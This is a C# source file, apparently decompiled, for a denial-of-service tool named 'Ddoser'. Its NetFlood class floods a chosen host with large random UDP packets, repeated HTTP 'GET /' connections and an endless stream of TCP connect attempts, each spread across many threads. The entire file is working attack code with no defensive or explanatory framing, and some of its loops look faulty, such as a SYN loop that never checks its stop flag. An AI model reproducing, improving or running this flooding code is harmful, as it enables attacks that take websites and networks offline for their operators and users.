using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Ddoser;

public class NetFlood
{
	private Random R;

	public bool IsFlooding { get; set; }

	public NetFlood()
	{
		R = new Random();
	}

	public void StartUdp(string fIP, int fPort)
	{
		StartUdp(fIP, fPort, 35, 100);
	}

	public void StartUdp(string fIP, int fPort, int Sockets)
	{
		StartUdp(fIP, fPort, Sockets, 100);
	}

	public void StartUdp(string fIP, int fPort, int Sockets, int Interval)
	{
		IsFlooding = true;
		for (int i = 1; i <= Sockets; i = checked(i + 1))
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				SendUdp((object[])a0);
			}, new object[3] { fIP, fPort, Interval });
		}
	}

	public void StartHttp(string host)
	{
		StartHttp(host, 35, 100);
	}

	public void StartHttp(string host, int sockets)
	{
		StartHttp(host, sockets, 100);
	}

	public void StartHttp(string host, int sockets, int interval)
	{
		IsFlooding = true;
		for (int i = 1; i <= sockets; i = checked(i + 1))
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				SendHttp((object[])a0);
			}, new object[2] { interval, host });
		}
	}

	public void StartSSYN(string fip, int fport)
	{
		StartSSYN(fip, fport, 35, 100);
	}

	public void StartSSYN(string fip, int fport, int sockets)
	{
		StartSSYN(fip, fport, sockets, 100);
	}

	public void StartSSYN(string fip, int fport, int sockets, int interval)
	{
		IsFlooding = true;
		for (int i = 1; i <= sockets; i = checked(i + 1))
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				SendSSYN((object[])a0);
			}, new object[3] { fip, fport, interval });
		}
	}

	public void StopFloods()
	{
		IsFlooding = false;
	}

	private void SendUdp(object[] obj)
	{
		string text = Conversions.ToString(obj[0]);
		int port = Conversions.ToInteger(obj[1]);
		int millisecondsTimeout = Conversions.ToInteger(obj[2]);
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
		IPAddress address = IPAddress.None;
		if (!IPAddress.TryParse(text, out address))
		{
			text = Dns.GetHostEntry(text).AddressList[0].ToString();
		}
		socket.Connect(text, port);
		byte[] array = new byte[65508];
		R.NextBytes(array);
		while (IsFlooding)
		{
			try
			{
				socket.Send(array, array.Length, SocketFlags.None);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(millisecondsTimeout);
		}
	}

	private void SendHttp(object[] obj)
	{
		int millisecondsTimeout = Conversions.ToInteger(obj[0]);
		string text = Conversions.ToString(obj[1]);
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		IPAddress address = IPAddress.None;
		if (!IPAddress.TryParse(text, out address))
		{
			text = Dns.GetHostEntry(text).AddressList[0].ToString();
		}
		while (IsFlooding)
		{
			try
			{
				socket.Connect(text, 80);
				socket.Send(Encoding.GetEncoding(1252).GetBytes("GET /"));
				socket.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				socket.Close();
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(millisecondsTimeout);
		}
	}

	private void SendSSYN(object[] obj)
	{
		string text = Conversions.ToString(obj[0]);
		int port = Conversions.ToInteger(obj[1]);
		Conversions.ToInteger(obj[2]);
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		IPAddress address = IPAddress.None;
		if (!IPAddress.TryParse(text, out address))
		{
			text = Dns.GetHostEntry(text).AddressList[0].ToString();
		}
		while (true)
		{
			try
			{
				socket.BeginConnect(text, port, SSYNCallback, null);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				socket.Close();
				ProjectData.ClearProjectError();
			}
		}
	}

	private void SSYNCallback(IAsyncResult ar)
	{
	}
}
